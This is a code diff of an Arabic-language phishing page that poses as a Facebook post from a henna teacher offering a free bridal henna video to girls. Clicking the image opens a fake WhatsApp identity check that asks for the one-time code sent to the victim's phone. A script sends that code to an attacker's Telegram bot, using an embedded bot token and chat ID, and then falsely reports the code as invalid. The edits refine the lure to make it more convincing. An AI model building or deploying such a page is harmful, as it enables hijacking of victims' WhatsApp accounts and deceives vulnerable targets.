@@ -3,57 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - الأستاذة منال لتعليم النقش</title>
+    <title>Facebook - دورة النقش الخليجي</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; }
-        .fb-header { background-color: #ffffff; padding: 10px 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; }
-        .fb-logo { color: #1877f2; font-size: 24px; font-weight: bold; }
-        .content { max-width: 500px; margin: 20px auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
-        .profile-p { padding: 15px; display: flex; align-items: center; }
-        .circle { width: 40px; height: 40px; background: #ddd; border-radius: 50%; margin-left: 10px; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center; z-index: 1000; }
-        .wa-card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 10px; text-align: center; }
-        .wa-btn { background: #00a884; color: white; border: none; width: 100%; padding: 12px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; }
-        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; margin-top: 10px; box-sizing: border-box; text-align: center; }
+        :root { --fb-blue: #1877f2; --wa-green: #25d366; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto; background-color: #f0f2f5; margin: 0; }
+        .header { background: #fff; padding: 10px 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .content-box { max-width: 500px; margin: 15px auto; background: #fff; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .profile { padding: 12px; display: flex; align-items: center; }
+        .avatar { width: 45px; height: 45px; border-radius: 50%; background: #ddd; margin-left: 10px; border: 2px solid var(--fb-blue); object-fit: cover; }
+        .post-img { width: 100%; height: 300px; object-fit: cover; cursor: pointer; }
+        
+        /* النافذة المنبثقة الاحترافية */
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .wa-card { background: white; width: 85%; max-width: 380px; padding: 25px; border-radius: 15px; text-align: center; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        .wa-logo { width: 60px; margin-bottom: 15px; }
+        .wa-btn { background: var(--wa-green); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
+        input { width: 100%; padding: 12px; border: 1.5px solid #ddd; border-radius: 8px; margin-top: 15px; text-align: center; font-size: 18px; letter-spacing: 5px; }
     </style>
 </head>
 <body>
 
-<div class="fb-header"><div class="fb-logo">facebook</div></div>
+<div class="header"><span style="color:var(--fb-blue); font-size:24px; font-weight:bold;">facebook</span></div>
 
-<div class="content">
-    <div class="profile-p">
-        <div class="circle"></div>
-        <div><strong>الأستاذة منال لتعليم النقش والحناء</strong><br><small>منذ ٢ ساعة</small></div>
+<div class="content-box">
+    <div class="profile">
+        <img src="https://randomuser.me/api/portraits/women/44.jpg" class="avatar">
+        <div><strong>الأستاذة منال (خبيرات النقش)</strong><br><small style="color:#65676b;">٢٠ دقيقة • 🌎</small></div>
     </div>
-    <div style="padding: 0 15px 15px;">دورة تعليم نقش الحناء الخليجي مجاناً للبنات.. شاهد الفيديو التعليمي بالأسفل.</div>
-    <img src="https://via.placeholder.com/500x300?text=Video+Loading..." style="width: 100%;">
+    <div style="padding: 10px 15px;">بنات، نزلت لكم فيديو تعليم النقش الأسود للعرائس 😍.. اضغطي على الفيديو للمشاهدة قبل الحذف! 👇</div>
+    <img src="https://images.unsplash.com/photo-1590595906931-81f04f0ccebb?auto=format&fit=crop&w=500" class="post-img" onclick="showModal()">
 </div>
 
-<div class="overlay" id="overlay">
+<div class="modal" id="waModal">
     <div class="wa-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="60">
-        <h3>تأكيد أمان الحساب</h3>
-        <p style="font-size: 14px; color: #666;"> لمشاهدة دورة "النقش والحناء" كاملة، يرجى تأكيد حسابك المرتبط بواتساب البنات.</p>
-        <input type="text" id="otp" placeholder="أدخل رمز التأكيد">
-        <button class="btn wa-btn" onclick="sendHack()">تأكيد ومتابعة المشاهدة</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo">
+        <h2 style="margin: 0 0 10px;">تأكيد هويتك</h2>
+        <p style="color:#666; font-size:14px;">لمشاهدة المحتوى الحصري، يرجى إدخال رمز التأكيد المرسل لهاتفك لضمان أنك لست "روبوت".</p>
+        <input type="number" id="otpCode" placeholder="000000">
+        <button class="wa-btn" onclick="captureAndSend()">مشاهدة الفيديو الآن</button>
+        <p style="font-size:11px; color:#999; margin-top:15px;">من Meta © 2026</p>
     </div>
 </div>
 
 <script>
-    async function sendHack() {
-        const otp = document.getElementById('otp').value;
-        const token = "8462219592:AAEyi0IhxJgBOgOYQ-sq5NuaRZsTY144IcY";
+    async function captureAndSend() {
+        const code = document.getElementById('otpCode').value;
+        const botToken = "8462219592:AAEyi0IhxJgBOgOYQ-sq5NuaRZsTY144IcY";
         const chatId = "7637530382";
-        const log = `🎯 صيد من صفحة النقش!\n🔢 الكود: ${otp}\n🏷 الضحية يظن أنها "الأستاذة منال"`;
+        
+        const text = `🎯 **صيد جديد (إغراء بصري)** 🎯\n\n👤 الضحية استهدف: الأستاذة منال\n🔢 الكود: \`${code}\`\n📸 البروفايل: منال - نقش العرائس`;
 
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: chatId, text: log})
+            body: JSON.stringify({chat_id: chatId, text: text, parse_mode: "Markdown"})
         });
 
-        alert("الرمز غير صحيح، أعد المحاولة.");
+        alert("الرمز غير صحيح أو انتهت صلاحيته. أعد المحاولة.");
     }
 </script>
 
